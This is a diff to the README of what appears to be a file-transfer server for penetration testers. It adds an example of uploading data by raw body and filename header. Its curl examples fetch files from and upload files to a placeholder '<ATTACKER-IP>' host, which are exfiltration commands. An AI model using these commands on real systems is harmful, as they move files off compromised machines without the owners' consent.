@@ -25,7 +25,7 @@ All the files that should be served must go into the **./static** folder.
 curl -O http://<ATTACKER-IP>/<FILENAME>
 ```
 
-###  Upload a file back to your attack device:
+###  Upload a file back to your attack device as multipart
 ```bash
 curl -F 'file=@<FILENAME>' http://<ATTACKER-IP>/
 ```
@@ -33,6 +33,11 @@ curl -F 'file=@<FILENAME>' http://<ATTACKER-IP>/
 ###  Multiple file upload supported, just add more -F 'file=@<FILENAME>'
 ```bash
 curl -F 'file=@<FILE1>' -F 'file=@<FILE2>' http://<ATTACKER-IP>/
+```
+
+###  Upload using raw body and filename header
+```bash
+curl -H "filename: test.txt" --data "this is raw data" http://<ATTACKER-IP>/
 ```
 
 ## Configuration
